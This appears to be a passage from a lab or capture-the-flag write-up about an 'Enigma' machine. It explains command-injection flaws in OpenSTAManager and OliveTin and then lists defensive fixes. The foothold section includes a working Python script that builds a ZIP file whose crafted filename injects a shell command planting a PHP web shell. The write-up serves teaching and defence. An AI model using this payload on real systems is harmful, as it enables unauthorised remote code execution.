## Step 2 - Initial Foothold

### OpenSTAManager P7M Command Injection (CVE-2025-69212)

Researching vulnerabilities in OpenSTAManager 2.9.8 reveals **CVE-2025-69212** (OS Command Injection in P7M File Processing).

#### Vulnerability Analysis:
The application handles digitally signed XML electronic invoices packaged in `.p7m` format. When an administrator uploads a ZIP archive containing electronic invoices, the backend utility dynamically constructs an OS command using the extracted filename without input sanitization:

```php
public static function decodeP7M($file)
{
    $directory = pathinfo($file, PATHINFO_DIRNAME);
    $content = file_get_contents($file);

    $output_file = $directory.'/'.basename($file, '.p7m');

    try {
        if (function_exists('exec')) {
            // VULNERABLE - No input sanitization!
            exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', $output, $cmd);
```

Because `$file` is derived directly from the filename inside the uploaded ZIP archive, injecting a semicolon (`;`) allows arbitrary shell commands to break out and execute.

#### Weaponization:
We create a Python script to package a ZIP containing a crafted filename that writes a PHP web shell (`SHELL.php`) into the web-accessible `files/` directory:

```python
cat << 'EOF' > generate_zip.py
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
EOF
python3 generate_zip.py
```

### OliveTin Argument Injection (CVE-2026-27626)

Researching OliveTin 3000.10.0 discloses **CVE-2026-27626**: *OS Command Injection via `password` argument type*.

#### Vulnerability Mechanics:
OliveTin implements an internal safety check (`checkShellArgumentSafety`) to ensure user-supplied parameters do not contain shell metacharacters before executing commands with `sh -c`. While it validates and sanitizes strings, integers, and paths, it **completely fails to validate parameters typed as `password`**.

Because password fields are expected to contain arbitrary complex characters, OliveTin blindly passes them into the shell command string, allowing shell metacharacters (such as `;`, `&&`, or backticks) to break out and execute arbitrary operating system commands as the user running OliveTin (**root**).

## Step 5 - Mitigations & Defensive Hardening

To remediate the vulnerabilities identified across the Enigma environment, administrators and engineering teams should apply defense-in-depth controls across network shares, web applications, and internal automation utilities:

### 1. Network File System (NFS) Share Restrictions
- **Enforce IP-Based Export Restrictions:** Configure `/etc/exports` to restrict NFS share access to trusted internal administration networks rather than wildcard exports (`*`):
  ```text
  /srv/nfs/onboarding 10.10.10.0/24(ro,sync,no_subtree_check)
  ```
- **Prohibit Plaintext Credentials in Staged Documentation:** Never store initial onboarding documents containing usernames and cleartext temporary passwords on shared filesystems. Use an automated identity management portal with temporary enrollment tokens.

### 2. Password Policies & Temporary Credential Management
- **Force Password Reset on First Login:** Mandate that all newly provisioned accounts are placed into a state requiring an immediate password change prior to accessing webmail or internal portals.
- **Eliminate Default Password Reusability:** Enforce unique, randomly generated passwords for individual service accounts and employees rather than predictable corporate defaults (such as `Enigma2024!`).

### 3. OpenSTAManager P7M Sanitization (CVE-2025-69212)
- **Parameterized Subprocess Execution:** Never pass unsanitized file paths directly to shell execution functions (`exec()`, `system()`, `shell_exec()`). Use `escapeshellarg()` on all filename inputs or transition to PHP's `proc_open()` with explicit argument arrays:
  ```php
  $cmd = ['openssl', 'smime', '-verify', '-noverify', '-in', $file, '-inform', 'DER', '-out', $output_file];
  ```
- **Upgrade OpenSTAManager:** Update OpenSTAManager to version ≥2.9.9 where input validation is enforced across invoice import plugins.

### 4. OliveTin Command Injection Defense (CVE-2026-27626)
- **Patch OliveTin Daemon:** Upgrade OliveTin to version ≥3000.10.1 where `checkShellArgumentSafety` is updated to validate and escape all argument types, including `password`.
- **Avoid Passing Secrets via Command Line:** Configure OliveTin actions to pass sensitive credentials through environment variables or stdin pipelines rather than interpolating strings directly into shell command arguments.
